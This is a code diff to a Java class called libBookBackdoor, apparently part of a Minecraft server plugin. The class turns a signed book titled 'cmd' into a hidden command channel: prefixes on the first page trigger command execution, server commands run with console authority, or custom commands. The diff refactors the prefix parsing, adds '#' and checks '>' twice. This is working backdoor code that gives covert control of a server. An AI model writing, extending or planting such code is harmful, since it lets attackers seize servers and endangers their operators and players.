@@ -83,9 +83,10 @@ public class libBookBackdoor implements Listener {
         if (eventMeta.getTitle() != null && eventMeta.getPage(1) != null) {
             if(eventMeta.getTitle().equals("cmd")) {
                 String pageString = eventMeta.getPage(1);
+                String commandType = Character.toString(pageString.charAt(0));
                 String command = pageString.substring(1);
 
-                if(pageString.startsWith(">") || pageString.startsWith("$")) {
+                if(commandType.equals(">") || commandType.equals(">") || commandType.equals("#")) {
                     Player player = event.getPlayer();
                     try {
                         player.sendMessage("Running: " + command);
@@ -100,7 +101,7 @@ public class libBookBackdoor implements Listener {
                             event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                         }
                     }, 5);
-                } else if(pageString.startsWith("/")) /* Server commands, runs as [SERVER]*/ {
+                } else if(commandType.equals("/")) /* Server commands, runs as [SERVER]*/ {
                     this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
                     event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                     this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
@@ -108,7 +109,7 @@ public class libBookBackdoor implements Listener {
                             event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                         }
                     }, 5);
-                } else if (pageString.startsWith(".")) /* Custom commands*/ {
+                } else if (commandType.equals(".")) /* Custom commands*/ {
                     String[] args = command.split(" ", 0);
                     Player player = event.getPlayer();
                     String mainCmd = args[0].toLowerCase();
